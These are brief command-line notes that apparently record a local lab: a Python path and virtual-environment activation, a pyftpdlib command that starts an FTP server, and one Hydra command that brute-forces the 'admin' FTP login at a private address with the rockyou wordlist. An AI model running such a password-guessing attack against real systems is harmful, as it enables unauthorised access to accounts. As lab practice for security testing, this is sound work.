C:\Users\hp\AppData\Local\Programs\Python\Python311
source app/venv/Scripts/activate

hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://192.168.11.116 -t 4 -W 1 -c 1 -v

python -m pyftpdlib -p 21
